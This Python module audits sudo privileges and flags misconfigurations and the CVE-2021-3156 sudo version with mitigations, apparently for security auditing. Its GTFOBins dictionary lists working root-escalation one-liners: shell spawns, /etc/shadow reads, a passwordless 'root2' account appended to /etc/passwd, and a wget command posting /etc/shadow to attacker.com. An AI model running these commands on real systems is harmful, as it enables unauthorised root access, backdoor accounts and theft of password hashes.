"""
Module: sudo_check.py
Purpose: Enumerate sudo privileges and detect misconfiguration
"""

import subprocess
import os
import re


def _run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except Exception:
        return ""


# ── GTFOBins entries that are dangerous as sudo without NOPASSWD ──────────────
DANGEROUS_SUDO_BINS = {
    "awk"         : "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "bash"        : "sudo bash",
    "cp"          : "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash",
    "curl"        : "sudo curl file:///etc/shadow",
    "dd"          : "echo 'root2::0:0::/root:/bin/bash' | sudo dd of=/etc/passwd bs=1 seek=$(wc -c < /etc/passwd)",
    "env"         : "sudo env /bin/bash",
    "find"        : "sudo find / -exec /bin/bash \\;",
    "ftp"         : "sudo ftp  → !/bin/bash",
    "gdb"         : "sudo gdb -nx -ex 'python import os; os.execl(\"/bin/bash\",\"bash\")' -ex quit",
    "git"         : "sudo git -p help config → !/bin/bash",
    "jq"          : "sudo jq -r '.' /etc/shadow",
    "less"        : "sudo less /etc/shadow → !/bin/bash",
    "lua"         : "sudo lua -e 'os.execute(\"/bin/bash\")'",
    "man"         : "sudo man man → !/bin/bash",
    "more"        : "sudo more /etc/shadow → !/bin/bash",
    "mount"       : "sudo mount with bind can expose root filesystem",
    "mv"          : "sudo mv can overwrite sensitive files",
    "mysql"       : "sudo mysql -e '\\! /bin/bash'",
    "nano"        : "sudo nano /etc/passwd → then edit",
    "nmap"        : "sudo nmap --interactive → !sh",
    "node"        : "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
    "openssl"     : "sudo openssl can read/write arbitrary files",
    "perl"        : "sudo perl -e 'exec \"/bin/bash\";'",
    "php"         : "sudo php -r 'system(\"/bin/bash\");'",
    "python"      : "sudo python -c 'import os; os.system(\"/bin/bash\")'",
    "python3"     : "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
    "rsync"       : "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' x x:",
    "ruby"        : "sudo ruby -e 'exec \"/bin/bash\"'",
    "sed"         : "sudo sed can read/write arbitrary files",
    "ssh"         : "sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x",
    "tar"         : "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "tee"         : "echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
    "vi"          : "sudo vi → :!/bin/bash",
    "vim"         : "sudo vim -c ':!/bin/bash'",
    "wget"        : "sudo wget --post-file=/etc/shadow attacker.com",
    "xxd"         : "sudo xxd /etc/shadow | xxd -r",
    "zip"         : "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='bash -c /bin/bash'",
}


def _parse_sudo_list(sudo_output: str) -> list:
    """Parse 'sudo -l' output into individual permission lines."""
    lines = []
    in_may_run = False
    for line in sudo_output.splitlines():
        stripped = line.strip()
        if "may run the following" in stripped.lower():
            in_may_run = True
            continue
        if in_may_run and stripped:
            lines.append(stripped)
    return lines


def _analyse_sudo_rule(rule: str) -> dict | None:
    """Analyse a single sudo rule for privilege escalation potential."""
    # Extract the command portion (after host= or just the command)
    # Typical format: (root) /usr/bin/python3
    #                 (ALL : ALL) NOPASSWD: /bin/bash
    match = re.search(r'\)\s*(NOPASSWD:\s*)?(.+)$', rule, re.IGNORECASE)
    if not match:
        return None

    nopasswd   = bool(match.group(1))
    command    = match.group(2).strip()
    binary     = os.path.basename(command.split()[0]).lower()

    if command.strip() in ("ALL", "(ALL)", "ALL:ALL"):
        return {
            "title"      : f"Unrestricted Sudo: {rule}",
            "category"   : "Sudo Misconfiguration",
            "severity"   : "critical",
            "rule"       : rule,
            "command"    : command,
            "nopasswd"   : nopasswd,
            "description": (
                "Current user can run ALL commands as root via sudo. "
                "Full root access is trivially available."
            ),
            "exploitation_possibility": "CRITICAL — run: sudo bash",
            "mitigation" : "Restrict sudo to specific commands only. "
                           "Remove wildcard (ALL) permission.",
        }

    if binary in DANGEROUS_SUDO_BINS:
        exploit_hint = DANGEROUS_SUDO_BINS[binary]
        return {
            "title"      : f"Dangerous Sudo Permission: {binary} {'(NOPASSWD)' if nopasswd else ''}",
            "category"   : "Sudo Misconfiguration",
            "severity"   : "critical" if nopasswd else "high",
            "rule"       : rule,
            "command"    : command,
            "binary"     : binary,
            "nopasswd"   : nopasswd,
            "description": (
                f"Sudo permission for '{binary}' allows shell escape or file access. "
                f"GTFOBins technique: {exploit_hint}"
            ),
            "exploitation_possibility": (
                f"{'CRITICAL' if nopasswd else 'HIGH'} — "
                f"GTFOBins technique: {exploit_hint}"
            ),
            "mitigation" : (
                f"Remove sudo permission for '{binary}'. "
                "If needed, restrict with NOEXEC flag and no shell-like arguments."
            ),
            "gtfobins_ref": f"https://gtfobins.github.io/gtfobins/{binary}/#sudo",
        }

    # Not in dangerous list — informational
    return {
        "title"      : f"Sudo Permission: {command} {'(NOPASSWD)' if nopasswd else ''}",
        "category"   : "Sudo Permission",
        "severity"   : "medium" if nopasswd else "info",
        "rule"       : rule,
        "command"    : command,
        "nopasswd"   : nopasswd,
        "description": f"Sudo permission granted for: {command}",
        "exploitation_possibility": "Requires manual review",
        "mitigation" : "Review whether this sudo permission is necessary",
    }


def _check_sudo_version() -> list:
    """Check for vulnerable sudo versions (Baron Samedit etc.)."""
    findings = []
    version_str = _run("sudo --version 2>/dev/null | head -1")
    if not version_str:
        return findings

    match = re.search(r'(\d+)\.(\d+)\.(\d+)', version_str)
    if not match:
        return findings

    major, minor, patch_v = int(match.group(1)), int(match.group(2)), int(match.group(3))

    # Baron Samedit: sudo < 1.9.5p2
    if (major, minor, patch_v) < (1, 9, 5):
        findings.append({
            "title"      : f"CVE-2021-3156 Baron Samedit: sudo {version_str}",
            "category"   : "Sudo Vulnerability",
            "severity"   : "critical",
            "cve_id"     : "CVE-2021-3156",
            "sudo_version": version_str,
            "description": (
                "Heap-based buffer overflow in sudo (versions < 1.9.5p2). "
                "Allows any local user to gain root without authentication."
            ),
            "exploitation_possibility": "CRITICAL — public exploits available",
            "mitigation" : "Upgrade sudo to >= 1.9.5p2 immediately",
            "reference"  : "https://nvd.nist.gov/vuln/detail/CVE-2021-3156",
        })

    findings.append({
        "title"      : f"Sudo Version: {version_str}",
        "category"   : "Sudo Information",
        "severity"   : "info",
        "sudo_version": version_str,
        "description": f"Installed sudo version: {version_str}",
        "exploitation_possibility": "Informational",
        "mitigation" : "Keep sudo updated to the latest stable version",
    })

    return findings


def check_sudo_misconfig() -> list:
    """Run all sudo-related checks."""
    findings = []

    # ── sudo -l ──────────────────────────────────────────────
    sudo_output = _run("sudo -l 2>/dev/null")
    if sudo_output:
        rules = _parse_sudo_list(sudo_output)
        for rule in rules:
            result = _analyse_sudo_rule(rule)
            if result:
                findings.append(result)
    else:
        findings.append({
            "title"      : "sudo -l: No permissions or command failed",
            "category"   : "Sudo Information",
            "severity"   : "info",
            "description": "No sudo permissions found or sudo not available for current user.",
            "exploitation_possibility": "N/A",
            "mitigation" : "N/A",
        })

    # ── sudo version check ───────────────────────────────────
    findings.extend(_check_sudo_version())

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda x: severity_order.get(x["severity"], 5))
    return findings